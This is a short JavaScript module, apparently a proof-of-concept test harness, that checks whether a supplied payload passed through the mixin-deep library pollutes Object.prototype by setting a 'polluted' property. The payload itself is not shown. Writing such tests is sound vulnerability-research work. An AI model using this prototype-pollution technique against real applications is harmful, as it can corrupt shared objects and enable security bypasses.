function exploitFunction(payload) {
  const mixin = require("mixin-deep");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin(obj, payload);
  expect({}.polluted).toBe("yes");
}

module.exports = { exploitFunction };